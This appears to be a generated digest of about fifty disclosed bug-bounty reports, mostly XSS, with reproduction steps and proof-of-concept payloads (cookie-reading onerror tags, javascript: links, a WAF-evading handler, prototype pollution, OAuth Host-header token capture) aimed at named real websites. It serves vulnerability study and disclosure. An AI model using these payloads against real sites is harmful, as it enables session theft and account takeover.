Medium Complexity Injection Vulnerabilities Analysis
==================================================

Total reports analyzed: 183

Weaknesses.XSS Vulnerabilities (74 reports)
--------------------------------------------------

Report 1: Possible DOM XSS on app.hey.com
================================================================================
Vulnerability Description:
The vulnerability is a DOM-based XSS in the search functionality of app.hey.com, where a malicious payload in the email subject can be rendered as HTML in the search results. While CSP currently blocks script execution, a bypass could lead to arbitrary JavaScript execution.

Steps to Reproduce:
1. Go to https://app.hey.com and log in to your account.
2. Click on 'Write' Mail button, add yourself as recipient, and insert the payload `TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;` into the Subject field. Send the mail.
3. In the top left corner Search Box, type "TestPayload" to find the sent mail. The `<a>` tag "ClickHere" will be rendered.
4. Click on "ClickHere" to observe the CSP violation in the Console.

--------------------------------------------------------------------------------

Report 2: Improper Sanitization leads to XSS Fire on admin panel
================================================================================
Vulnerability Description:
The vulnerability is a Cross-Site Scripting (XSS) issue on the admin panel due to improper sanitization of HTML input on the registration page. An attacker can inject malicious scripts into the 'Company' field, which executes when an admin views the user record, leading to potential data theft, session hijacking, or malware installation.

Steps to Reproduce:
1. Goto https://accounts.informatica.com/registration.html and create a temporary account
2. Enter a blind xss payload into the Company field
3. Wait until an admin opens the user record
4. Then, the report should be generated (I used https://xsshunter.com/)

--------------------------------------------------------------------------------

Report 3: Blind stored XSS due to insecure contact form at https://█████.mil leads to leakage of session token and 
================================================================================
Vulnerability Description:
A blind stored cross-site scripting (XSS) vulnerability exists in the contact form at https://█████.mil/ due to insufficient input sanitization. An attacker can submit malicious scripts via the form fields, which are then executed in the admin panel, leading to session token leakage and potential admin panel access.

Steps to Reproduce:
1. Browse to the page at https://█████.mil/ and fill out the contact form, submitting a blind XSS payload in the First Name, Last Name, Company, and Description fields.
2. Submit the form and wait for an admin to access the information, triggering the XSS in the admin panel and notifying the XSS hunter service.

--------------------------------------------------------------------------------

Report 4: Blind Stored XSS Payload fired at the backend on https://█████████/
================================================================================
Vulnerability Description:
This is a blind stored Cross-Site Scripting (XSS) vulnerability that allows an attacker to inject malicious scripts into the backend of the target website. When an administrator views the affected page, the script executes, enabling the attacker to capture sensitive information such as the administrator's actions, cookies, and database credentials.

Steps to Reproduce:
1. Identify an input field on the target website (https://█████████/) that does not properly sanitize user input.
2. Inject a blind stored XSS payload into the identified input field. The payload should be designed to execute when an administrator views the affected page.
3. Monitor the XSSHunter service for notifications indicating that the payload has been triggered by an administrator.
4. Once triggered, extract sensitive information such as the administrator's IP address, user-agent, cookies, and potentially exposed database credentials.

--------------------------------------------------------------------------------

Report 5: Stored XSS in wordpress.com
================================================================================
Vulnerability Description:
This is a Stored XSS vulnerability in WordPress.com's Custom Style section. An attacker can inject malicious JavaScript into a style name, which is then executed in the context of the victim's browser when they interact with the affected style. This can lead to session hijacking, unauthorized actions on behalf of the victim, or phishing attacks.

Steps to Reproduce:
1. As an attacker, go to the feedback section, then go to the Polling section.
2. Add a new post or edit an existing post.
3. Scroll down, click 'All Styles'.
4. Add a new Style.
5. Name the temporary style, click 'Save Style'.
6. Change the Style Name with '<noscript><p title="</noscript><img src=x onerror=alert(document.cookie)>">', check the checkbox next to 'Save Style', click 'Save Style'.
7. Script will be run.
8. Invite the victim in a way, go to 'manage' then 'users'.
9. Click 'invite', enter username or email, and send.
10. As a Victim, accept the attacker's invitation.
11. Go to the Feedback section.
12. Then go to the Polling section.
13. Add a new post or edit an existing post.
14. Scroll down, click 'All Styles'.
15. Enter the Style that has been created by the previous Attacker.
16. Script will be run.

--------------------------------------------------------------------------------

Report 6: Stored XSS via Mermaid Prototype Pollution vulnerability
================================================================================
Vulnerability Description:
The vulnerability is a Stored XSS via Mermaid Prototype Pollution, where an attacker can inject a malicious JSON object in a Mermaid diagram directive to pollute the Object prototype, leading to a Denial of Service (DOS) by breaking the application's functionality.

Steps to Reproduce:
1. Create an issue in any repository
2. Add a Mermaid diagram with the payload: %%{init: { '__proto__': {'polluted': 'asdf'}} }%% followed by a sequence diagram
3. Save the issue and observe the page becomes unresponsive

--------------------------------------------------------------------------------

Report 7: Reflected/Stored XSS on duckduckgo.com
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in DuckDuckGo's search results, where a payload left on urbandictionary.com can trigger HTML injection and JavaScript execution when the search results are rendered on DuckDuckGo's main page. This allows an attacker to execute arbitrary JavaScript in the context of DuckDuckGo's domain.

Steps to Reproduce:
1. Search the following in the DuckDuckGo search bar: `urban dictionary "><img src=x<`
2. Observe that the payload renders and executes JavaScript on the DuckDuckGo page

--------------------------------------------------------------------------------

Report 8: Mattermost Server OAuth Flow Cross-Site Scripting
================================================================================
Vulnerability Description:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the OAuth flow in Mattermost Server. A victim clicking a malicious link pointing to the target Mattermost host will trigger the XSS. If the victim is a regular user, it is possible to obtain all of their Mattermost chat contents; if it’s an administrator, it is possible to create a new administrator. The root cause is the application's failure to sanitize the 'redirect_to' HTTP query parameter before reflecting it within the HTML response during the OAuth flow.

Steps to Reproduce:
1. Visit the following URL after replacing <mattermost_url> with the domain/ip of the mattermost server instance: https://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror=%22alert(%27zi0Black%20@%20Shielder%27)%22%3E
2. Notice the JavaScript's generated pop-up

--------------------------------------------------------------------------------

Report 9: Shop - Reflected  XSS  With  Clickjacking Leads to Steal User's Cookie  In Two Domain
================================================================================
Vulnerability Description:
The vulnerability combines reflected XSS with clickjacking due to missing X-Frame-Options headers. An attacker can craft a malicious page that embeds the vulnerable site in an iframe, tricking users into executing XSS payloads that steal their cookies.

Steps to Reproduce:
1. Navigate to the vulnerable URLs: https://marthastewart.com/shop/all.html?s= or https://bhg.com/shop/all.html?s=
2. Inject a reflected XSS payload into the 's' parameter, such as: %E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
3. Observe that the payload executes, confirming the XSS vulnerability
4. Create a POC.html file that embeds the vulnerable URL in an iframe (due to lack of X-Frame-Options header) to perform clickjacking
5. Send the POC.html to a victim. When opened, it will execute the XSS payload and steal the victim's cookies

--------------------------------------------------------------------------------

Report 10: cross site scripting in : mtn.bj
================================================================================
Vulnerability Description:
Cross-site scripting (XSS) vulnerability in mtn.bj allows execution of malicious JavaScript via a crafted file name during file upload.

Steps to Reproduce:
1. Go to: https://www.mtn.bj/business/ressources/formulaires/plan-de-localisation-de-compte/?next=https://www.mtn.bj/business/ressources/formulaires/formulaire-de-souscription/
2. Fill all inputs with any data
3. In file upload, upload a file with payload file name such as: "><img src=x onerror=alert(document.cookie);.jpg
4. The payload will be executed in the page

--------------------------------------------------------------------------------

Report 11: Stored XSS via Mermaid Prototype Pollution vulnerability
================================================================================
Vulnerability Description:
This vulnerability involves a Stored XSS via Mermaid Prototype Pollution, where an attacker can inject malicious JavaScript through a specially crafted Mermaid diagram. The payload pollutes the prototype chain, leading to XSS execution when certain user interactions occur (like clicking the search bar).

Steps to Reproduce:
1. Create an issue in any repository
2. Insert a Mermaid diagram with the payload that pollutes the prototype via '__proto__' attribute
3. After the page loads, interact with the search bar to trigger the XSS

--------------------------------------------------------------------------------

Report 12: Blind XSS via Feedback form.
================================================================================
Vulnerability Description:
Blind XSS via feedback form that triggers on the admin panel, allowing the attacker to execute JavaScript in the context of the admin panel and potentially access sensitive information.

Steps to Reproduce:
1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials.
2. Click the Apps tab from the left side and then click Judge.me Product Reviews.
3. Click Add Widgets then Start Installation and continue.
4. When the installation is done, choose 'No, please remove all widgets' button.
5. Submit a blind XSS payload in the feedback form that appears.
6. Wait for the payload to trigger on the admin panel (https://judge.me/admin).

--------------------------------------------------------------------------------

Report 13: XSS in various MessageTypes
================================================================================
Vulnerability Description:
Rendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client. The vulnerability arises from unsanitized message parameters in certain MessageTypes, allowing authenticated adversaries to craft messages that exploit XSS in the displaying frontend clients.

Steps to Reproduce:
1. Login to Rocket.Chat
2. Find any Room ID (window URL path from direct messages or avatar image path from channels)
3. Call sendMessage Meteor Method with t parameter and the affected source parameter

--------------------------------------------------------------------------------

Report 14: Stored XSS on issue comments and other pages which contain notes
================================================================================
Vulnerability Description:
The vulnerability involves two XSS sanitization bypasses in GitLab: one through the SyntaxHighlightFilter which creates HTML from unsanitized data, and another through the gl-emoji custom element which bypasses the gitlab-ui v-safe-html directive sanitization. This allows an attacker to execute arbitrary JavaScript in the context of the victim's session.

Steps to Reproduce:
1. Launch a self-managed GitLab instance
2. Create an issue and paste the provided XSS payload into the comment field
3. Submit the comment and observe the XSS execution when the page is viewed

--------------------------------------------------------------------------------

Report 15: XSS via Mod Log Removed Posts
================================================================================
Vulnerability Description:
An XSS vulnerability exists in the mod notes feature where a malicious payload embedded in a post's title executes when a moderator removes the post and views the attacker's mod notes. The payload may also execute when hovering over the attacker's profile if recent mod actions have been taken.

Steps to Reproduce:
1. The attacker creates a new post with a title containing an XSS payload.
2. The victim (subreddit moderator) removes the attacker's post, triggering the XSS payload when viewing the attacker's mod notes.

--------------------------------------------------------------------------------

Report 16: Cross-site scripting on dashboard2.omise.co
================================================================================
Vulnerability Description:
Cross-site scripting (XSS) is an attack vector that injects malicious code into a vulnerable web application. Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. In this case, the script is stored in the export settings and triggers when the dashboard is accessed.

Steps to Reproduce:
1. Log in to your account.
2. Visit https://dashboard.omise.co/test/settings.
3. Under Export - Specify the metadata that you want to include in your export option. Enter `<script>alert(2)</script>` in all four parameters including Charge, Transfer, Refund, Dispute.
4. Click on Update settings.
5. Click on Try our new dashboard, XSS will Trigger or log out and log in again, and XSS will Trigger.

--------------------------------------------------------------------------------

Report 17: XSS in ZenTao integration affecting self hosted instances without strict CSP
================================================================================
Vulnerability Description:
The ZenTao integration in GitLab is vulnerable to XSS attacks due to unsanitized URLs in API responses, allowing attackers to inject JavaScript via crafted issue details.

Steps to Reproduce:
1. Log in to a self-hosted GitLab instance with premium subscription and create a new project.
2. Configure ZenTao integration with a malicious server URL and visit the issue details page to trigger XSS.

--------------------------------------------------------------------------------

Report 18: Bypass: Stored-XSS with CSP-bypass via scoped labels' color
================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability exists in GitLab's handling of scoped label colors during GitHub imports, allowing attackers to bypass Content Security Policy (CSP) and execute arbitrary JavaScript in the context of the victim's session. The vulnerability stems from insufficient sanitization of label color values in scoped labels, which were not fully addressed in the initial fix for regular labels.

Steps to Reproduce:
1. Create a premium GitLab account with scoped labels enabled and obtain a personal access token with API scope.
2. Use a modified GitHub server to create a label with a malicious color value containing XSS payload in the format: '>yvvdwf-label<form class="hidden gl-show-field-errors"><input title="<script>alert(document.domain)</script>'>'
3. Import the malicious label into GitLab using the API with a curl command that specifies the GitHub server URL, target namespace, and the malicious label details.
4. Trigger the XSS by viewing the imported label in GitLab's interface, which executes the JavaScript payload due to improper sanitization of the label color field.

--------------------------------------------------------------------------------

Report 19: Stored XSS on Admin Access Page - Email field
================================================================================
Vulnerability Description:
The Email field on the Admin Access page is not sanitized, allowing a Stored Cross-Site Scripting (XSS) vulnerability. This enables an attacker to execute arbitrary JavaScript in the context of other administrators' sessions, potentially leading to client-side attacks like phishing, defacement, or keylogging.

Steps to Reproduce:
1. Login as admin1 and navigate to Preferences > Change E-mail.
2. Enter the current password and set the Email address to 'admin1@example.com<script>alert('xss');</script>'. Save and logout.
3. Login as admin2 and navigate to Inventory > Admin Access to observe the alert box.

--------------------------------------------------------------------------------

Report 20: [Android] HTML Injection in BatterySaveArticleRenderer WebView
================================================================================
Vulnerability Description:
The vulnerability is an HTML injection in the BatterySaveArticleRenderer WebView of the Android Brave Browser. By injecting a script into the title or author name fields, an attacker can manipulate the WebView to redirect to a malicious URL or alter the page content. The injected script executes when the Article Mode is activated, demonstrating a lack of proper input sanitization in the WebView rendering process.

Steps to Reproduce:
1. Open https://blackfan.ru/brave or a custom HTML file containing the provided script
2. Wait for the page to fully load, then click on the ArticleModeButton

--------------------------------------------------------------------------------

Report 21: Reflected - XSS
================================================================================
Vulnerability Description:
This is a reflected Cross-Site Scripting (XSS) vulnerability where user-supplied input is not properly sanitized before being reflected back in the response. An attacker can inject malicious JavaScript code that executes when a user interacts with the injected element, potentially leading to session hijacking or other malicious actions.

Steps to Reproduce:
1. Navigate to https://www.mtn.bj/
2. Go to Messages and enter the XSS payload: <h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
3. Right-click on the injected element to trigger the popup

--------------------------------------------------------------------------------

Report 22: Subdomain Takeover (moderator.ubnt.com)
================================================================================
Vulnerability Description:
The subdomain moderator.ubnt.com is vulnerable to subdomain takeover due to its CNAME record pointing to ghs.google.com, which is no longer in use. An attacker can claim this subdomain by registering it with Google, allowing them to host malicious content or phishing pages, potentially damaging the main domain's reputation and security.

Steps to Reproduce:
1. Identify the subdomain (moderator.ubnt.com) pointing to a non-existent or abandoned service (ghs.google.com).
2. Verify the subdomain is vulnerable by checking DNS records (CNAME pointing to ghs.google.com) and observing the error page.
3. Claim the subdomain by registering it with the service provider (Google in this case).
4. Demonstrate the takeover by hosting malicious content or phishing pages on the subdomain.

--------------------------------------------------------------------------------

Report 23: UXss on brave browser via scan QR Code
================================================================================
Vulnerability Description:
This is a Universal Cross-Site Scripting (UXSS) vulnerability in Brave Browser (and other Chromium-based browsers) that allows an attacker to execute arbitrary JavaScript in the context of any open domain by exploiting the QR code scanning feature. The vulnerability stems from improper isolation of the QR code scanning interface, allowing script execution across all tabs.

Steps to Reproduce:
1. Open Brave browser
2. Open www.google.com
3. Click the URL bar and delete the URL (click the cross on the URL bar)
4. Click the 'Scan QR Code' button that appears
5. Scan the malicious QR code provided by the attacker
6. Observe XSS execution on all open domains

--------------------------------------------------------------------------------

Report 24: Persistent XSS in www.starbucks.com
================================================================================
Vulnerability Description:
A persistent XSS vulnerability exists on www.starbucks.com due to loading scripts from an unregistered subdomain (starbucksmacchiato-prod.elasticbeanstalk.com). An attacker could register this subdomain and serve malicious JavaScript, leading to persistent XSS on Starbucks' website.

Steps to Reproduce:
1. Identify that the subdomain starbucksmacchiato-prod.elasticbeanstalk.com is not registered on Elastic Beanstalk by checking its DNS resolution.
2. Register the subdomain on Elastic Beanstalk and deploy a webserver that serves malicious JavaScript to exploit the XSS vulnerability when the script is loaded by Starbucks' website.

--------------------------------------------------------------------------------

Report 25: [kb.informatica.com] DOM based XSS in the bindBreadCrumb function
================================================================================
Vulnerability Description:
The vulnerability is a DOM-based XSS in the bindBreadCrumb function, where insecure link assignments use non-encoded URL values, allowing an attacker to inject malicious JavaScript via the referrer value under specific conditions.

Steps to Reproduce:
1. Open the link http://spqr.zz.mu/loc.php?//search.informatica.com&'/onmouseover='alert(document.domain)'&url=https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx in Internet Explorer.
2. Wait for the page to load and hover the mouse cursor over the 'Search results' link at the top to execute the script.

--------------------------------------------------------------------------------

Report 26: [network.informatica.com] The login form XSS via the referer value
================================================================================
Vulnerability Description:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the referer parameter in the login form of network.informatica.com. The referer value is inserted into JavaScript code without proper validation, allowing an attacker to inject malicious JavaScript that will be executed in the victim's browser when they visit a specially crafted URL.

Steps to Reproduce:
1. Navigate to https://network.informatica.com/login!input.jspa?referer=javascript:alert(document.domain)
2. Observe the JavaScript execution in the victim's browser

--------------------------------------------------------------------------------

Report 27: Stored XSS in topics because of whitelisted_generic engine vulnerability
================================================================================
Vulnerability Description:
The vulnerability is a Stored XSS in topics due to a flaw in the whitelisted_generic onebox engine. Despite escaping OpenGraph data, the engine decodes variable values and injects them into raw HTML, allowing XSS attacks.

Steps to Reproduce:
1. Paste the payload URL in the topic: http://89.223.28.48/og_image.html?uncache1234
2. View the example post with stored XSS: https://try.discourse.org/t/testing-is-in-progress/620

--------------------------------------------------------------------------------

Report 28: Wordpress 4.7.2 - Two XSS in Media Upload when file too large.
================================================================================
Vulnerability Description:
An attacker can inject a malicious script into the filename of a file that exceeds the maximum upload size limit. When the upload fails due to size, the filename is interpolated into an error message without proper sanitization, leading to XSS in the administrator's control panel.

Steps to Reproduce:
1. Create a large file (e.g., 20MB) with a malicious filename containing an XSS payload, such as 'Dinosaurs secret life<img src=x onerror=alert(1)>.png'.
2. Upload the file to a WordPress site via the media uploader (e.g., http://127.0.0.1/wp-admin/media-new.php) using drag-and-drop, file manager, or the 'Select Files' button.

--------------------------------------------------------------------------------

Report 29: Reflected XSS in https://nin.mtn.ng/nin/success?message=lol&nin=<VULNERABLE>
================================================================================
Vulnerability Description:
The vulnerability is a reflected Cross-Site Scripting (XSS) issue where user-supplied input in the 'nin' parameter is directly reflected in the response without proper sanitization, allowing an attacker to execute arbitrary JavaScript in the victim's browser.

Steps to Reproduce:
1. Navigate to the URL: https://nin.mtn.ng/nin/success?message=lol&nin=<VULNERABLE>
2. Replace <VULNERABLE> with a JavaScript payload (e.g., <script>alert('XSS')</script>)

--------------------------------------------------------------------------------

Report 30: Stored xss at https://█.8x8.com/api/█/ID
================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability exists in the payment information endpoint of 8x8.com. An attacker can inject malicious JavaScript via the IP address field, which is then executed when the payment information is retrieved.

Steps to Reproduce:
1. Identify the endpoint https://██████.8x8.com/api/██████mentInfoById/ID which returns user payment information with Content-Type: text/html;charset=UTF-8.
2. Modify the IP address via the endpoint https://███.8x8.com/api/patchPaymentMethod/ID with a malicious payload (e.g., <svg on onload=(alert)(document.domain)>).
3. Verify the stored XSS by accessing the modified payment information endpoint and observing the payload execution.

--------------------------------------------------------------------------------

Report 31: XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app
================================================================================
Vulnerability Description:
This vulnerability is a Cross-Site Scripting (XSS) issue in the Shopify admin interface, triggered through a malicious app. The flaw arises from improper escaping in the Shopify.API.Modal.input method's template rendering, allowing JavaScript execution in the admin context via Twine's data binding.

Steps to Reproduce:
1. Create a malicious Shopify application and associate it with a partner account.
2. Convince an administrator to authorize the malicious application by directing them to the OAuth authorization URL.
3. Once authorized, the application triggers the XSS vulnerability via the Shopify.API.Modal.input method with a crafted payload.
4. The payload executes arbitrary JavaScript in the context of the Shopify admin domain, demonstrating the XSS vulnerability.

--------------------------------------------------------------------------------

Report 32: Stored XSS in comments on https://www.starbucks.co.uk/blog/*
================================================================================
Vulnerability Description:
The vulnerability is a stored Cross-Site Scripting (XSS) in the comments section of Starbucks' blog posts. The 'author' parameter in the comment submission is not properly sanitized, allowing an attacker to inject arbitrary HTML and JavaScript. The attack bypasses the WAF by using less common event handlers like 'onbeforescriptexecute'.

Steps to Reproduce:
1. Navigate to a Starbucks blog post (e.g., https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability)
2. Submit a comment with a malicious payload in the 'author' parameter, such as: </li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>
3. Observe that the payload executes when the page is reloaded or viewed by another user

--------------------------------------------------------------------------------

Report 33: XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications
================================================================================
Vulnerability Description:
The vulnerability is an XSS (Cross-Site Scripting) issue in Shopify's sales channel applications due to a whitelist bypass in SVG icon uploads. By including an XML entity in the SVG, the whitelist enforcement is bypassed, allowing malicious attributes like 'onload' to be included. This leads to XSS on both partners.shopify.com and the admin panel of any shop that authorizes the sales channel.

Steps to Reproduce:
1. Create a new application in the Shopify Partners dashboard.
2. Navigate to 'Extensions' -> 'Sales channel' to convert the application.
3. Upload a malicious SVG file in the 'Navigation icon' field under 'App info' with XML entities to bypass the whitelist.
4. Save the changes to trigger the XSS payload on partners.shopify.com.
5. Authorize the application on a shop to trigger the XSS payload on $shop$.myshopify.com/admin/.

--------------------------------------------------------------------------------

Report 34: DOM Based Reflected Cross Site Scripting
================================================================================
Vulnerability Description:
The vulnerability is a DOM-based reflected Cross-Site Scripting (XSS) in an outdated version of Swagger used by the notification server. By injecting a malicious script via the 'configUrl' parameter, an attacker can execute arbitrary JavaScript in the context of the victim's browser session.

Steps to Reproduce:
1. Go to the URL: https://notification-server-v2.sz-my.mtn.com/index.html?configUrl=https://jumpy-floor.surge.sh/test.json
2. Observe the alert pop-up indicating the execution of arbitrary JavaScript

--------------------------------------------------------------------------------

Report 35: [doc.rt.informaticacloud.com] Reflected XSS via Stack Strace
================================================================================
Vulnerability Description:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the stack trace error message. The application reflects user input in the error response without proper sanitization, allowing JavaScript execution in the context of the victim's browser session.

Steps to Reproduce:
1. Navigate to the URL: http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/nav/7_1_2_3_2_1<svg/onload=alert(document.domain)>
2. Observe the reflected XSS in the error response, which includes the injected JavaScript code in the stack trace

--------------------------------------------------------------------------------

Report 36: XSS through document projects
================================================================================
Vulnerability Description:
This vulnerability allows for Cross-Site Scripting (XSS) by injecting JavaScript code into a document project on Khan Academy. The injected script executes when the project is loaded, potentially redirecting users to another site.

Steps to Reproduce:
1. Identify a Khan Academy document project that outputs HTML.
2. Intercept the PUT request to update the project (https://www.khanacademy.org/api/internal/scratchpads/ID) and inject JavaScript code within an <img> tag's onload attribute.

--------------------------------------------------------------------------------

Report 37: Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload
================================================================================
Vulnerability Description:
Stored XSS vulnerability in the Private Messages 'Reply' feature where malicious JavaScript in the original message is executed when the recipient replies, due to improper sanitization of quoted content.

Steps to Reproduce:
1. Log in to the Concrete5 CMS as any user
2. Navigate to the private messages section and send a message containing a malicious XSS payload (closing </textarea> tag followed by JavaScript in a <script> tag)
3. Have another user (e.g., admin) receive and reply to this message, triggering the XSS payload execution

--------------------------------------------------------------------------------

Report 38: Ability to create own account UUID leads to stored XSS
================================================================================
Vulnerability Description:
The vulnerability allows a user to inject arbitrary JavaScript via a crafted UUID, leading to stored XSS. The system fails to properly sanitize the UUID input, enabling script execution in contexts where the UUID is displayed (e.g., admin panels).

Steps to Reproduce:
1. Send a POST request to `/c/user` with a crafted `uuid` parameter containing a script tag and a URL-shortened external script source.
2. Visit the generated link (e.g., `https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002`) to trigger the XSS payload.

--------------------------------------------------------------------------------

Report 39: Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)
================================================================================
Vulnerability Description:
A Blind XSS vulnerability in the Mobpub Marketplace Admin Production | Sentry dashboard allows an attacker to execute arbitrary JavaScript in the context of an administrative session by injecting a malicious payload via the User-Agent header in a request to demand.mopub.com.

Steps to Reproduce:
1. Send a crafted HTTPS request to https://demand.mopub.com/accounts/login/ with a malicious User-Agent header containing a Blind XSS payload.
2. Wait for an administrator to access the Sentry dashboard (http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/), which triggers the XSS payload.

--------------------------------------------------------------------------------

Report 40: Reflected XSS on Amazon EC2 Instance
================================================================================
Vulnerability Description:
A reflected XSS vulnerability was discovered on the Amazon EC2 instance, allowing an attacker to inject malicious JavaScript code, potentially leading to unauthorized access to sensitive data or system compromise. The payload is injected into the errorCode parameter, which is reflected back to the user without proper validation or sanitization.

Steps to Reproduce:
1. Navigate to the vulnerable Amazon EC2 instance URL with the errorCode parameter.
2. Inject the malicious JavaScript payload into the errorCode parameter: ███████);alert(document.domain)//

--------------------------------------------------------------------------------

Report 41: XSS on using the legacy "Graphie To Png" API
================================================================================
Vulnerability Description:
This vulnerability allows an attacker to perform a Cross-Site Scripting (XSS) attack by uploading a malicious SVG and JSON file to the 'Graphie to PNG' API. The SVG includes an onload attribute that executes JavaScript, and the JSON file contains a script in the labels content that is injected into the DOM when the graphie is rendered. This can lead to account takeovers on pages that use graphies.

Steps to Reproduce:
1. Upload a malicious SVG with an onload attribute and a JSON file with a script in the labels content to the Graphie to PNG API.
2. Wait for the CDN to update its cache and then access the malicious graphie on a page that uses graphies to trigger the XSS.

--------------------------------------------------------------------------------

Report 42: Markdown parsing issue enables insertion of malicious tags and event handlers
================================================================================
Vulnerability Description:
The vulnerability involves a markdown parsing issue where a specific combination of characters (`_` and `@`) allows an attacker to inject malicious HTML tags (like `<marquee>`) and event handlers. The parser incorrectly handles these characters, leading to HTML output that includes unintended and potentially dangerous elements.

Steps to Reproduce:
1. Enter the following markdown text into the vulnerable markdown parser: `1</http:<marquee>hello`
2. Observe the rendered HTML output which includes unexpected `<marquee>` tags and potential for arbitrary attribute injection

--------------------------------------------------------------------------------

Report 43: [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
================================================================================
Vulnerability Description:
The metascraper library is vulnerable to Stored XSS via Open Graph metadata due to lack of HTML sanitization. When metadata containing malicious scripts is scraped and rendered directly in HTML, the scripts execute in the context of the page displaying them.

Steps to Reproduce:
1. Create a malicious HTML file with XSS payload in Open Graph metadata (og:site_name)
2. Set up a server to serve the malicious HTML file and a JavaScript payload
3. Create a Node.js application using metascraper to scrape the malicious site
4. Visit the Node.js application's endpoint to trigger the XSS execution

--------------------------------------------------------------------------------

Report 44: [anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to embed malicious HTML in file names served by the 'anywhere' static file server, which can lead to the execution of arbitrary JavaScript when the file is accessed. This is possible due to insufficient sanitization of file names when they are rendered in the directory listing.

Steps to Reproduce:
1. Create a file with a malicious filename: `1"><iframe src="malware_frame.html">`
2. Create a malicious HTML file (`malware_frame.html`) and a JavaScript file (`malware.js`) in the same directory
3. Run the anywhere static file server in the directory: `./node_modules/anywhere/bin/anywhere -p 8080`
4. Open the served page in a browser to trigger the malicious JavaScript execution

--------------------------------------------------------------------------------

Report 45: [simple-server] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript 
================================================================================
Vulnerability Description:
The vulnerability allows embedding HTML in file names served by simple-server, which can lead to the execution of malicious JavaScript when the directory listing is viewed. This occurs due to the lack of HTML sanitization in the outdated connect framework's directory middleware.

Steps to Reproduce:
1. Create a file with the name: "><iframe src="malware_frame.html"> in the directory served by simple-server
2. Create a malware_frame.html file in the same directory with malicious JavaScript content
3. Run simple-server in the directory containing the malicious files
4. Access the server via browser to trigger the execution of the malicious JavaScript

--------------------------------------------------------------------------------

Report 46: Account Takeover in Periscope TV
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to perform an account takeover on Periscope TV by manipulating the Host header during Twitter OAuth login. When the victim authorizes the login, their OAuth token is sent to the attacker's domain instead of Periscope's, enabling the attacker to gain control of the victim's account.

Steps to Reproduce:
1. Visit https://www.periscope.tv/ and click login with Twitter
2. Intercept the login request and change the Host header to attacker.com/www.periscope.tv
3. Send the modified OAuth redirect link to the victim
4. After victim authorization, capture their OAuth token and verifier from attacker.com

--------------------------------------------------------------------------------

Report 47: Persistent XSS in https://sandbox.reverb.com/item/
================================================================================
Vulnerability Description:
A Persistent XSS vulnerability exists in the SoundCloud link parameter of a listing page on Reverb's sandbox environment. The application fails to properly encode user input and relies solely on client-side validation, allowing an attacker to inject malicious JavaScript that executes when the page loads.

Steps to Reproduce:
1. Navigate to the 'Edit Listing' page on https://sandbox.reverb.com/listings/[YOUR_LISTING_ID]/edit
2. Intercept the request when clicking 'Save & Review Listing' and tamper with the 'product[soundcloud_link_attributes][link]' parameter to include the XSS payload: https://soundcloud.com/rich-the-kid/sets/the-world-is-yours-15?fuzzing" onload=alert(document.domain) x="

--------------------------------------------------------------------------------

Report 48: XSS (Persistent) - Selecting role(s) for protected branches
================================================================================
Vulnerability Description:
A persistent XSS vulnerability exists in GitLab's protected branch settings where a malicious username can trigger JavaScript execution when viewed in the merge permissions dropdown. The attack requires the victim to have Master access and the attacker to have Starter or higher subscription level.

Steps to Reproduce:
1. Set your username to a malicious string: `<img src=x onerror=alert(document.domain)> foo / bar`
2. Navigate to Project Settings -> Repository -> Protected Branches and select the dropdown under 'Ability to Merge' section

--------------------------------------------------------------------------------

Report 49: Stored XSS in Node-Red
================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability in Node-RED allows an attacker to execute arbitrary JavaScript code in the context of any user's browser by injecting malicious scripts into various input fields (e.g., node names, flow names). The payload becomes persistent after deployment, affecting all users who access the Node-RED interface.

Steps to Reproduce:
1. Install Node-RED: sudo npm install -g --unsafe-perm node-red
2. Run Node-RED and access it at http://localhost:1880
3. Drag & drop any item from the left menu to the center and insert the XSS payload (<script>alert('xss')</script>) in the name field, then click 'done'
4. Click the 'deploy' button to make the XSS payload execute for any user browsing to http://localhost:1880
5. Alternatively, create a new 'flaw' by clicking the '+' button, insert the XSS payload in the name field, deploy, and double-click the 'flaw' to execute the JavaScript

--------------------------------------------------------------------------------

Report 50: Stored Xss Vulnerability on ████████
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists where an attacker can upload a malicious SVG or HTML file, which when previewed, executes arbitrary JavaScript code.

Steps to Reproduce:
1. Go to the registration page and create an account.
2. Navigate to the blog section and create a new post.
3. Click on the 'Insert' button and upload a malicious SVG or HTML file.
4. Preview the post to trigger the XSS alert.

--------------------------------------------------------------------------------

Report 51: CSS Injection on /embed/ via bgcolor parameter leaks user's CSRF token and allows for XSS 
================================================================================
Vulnerability Description:
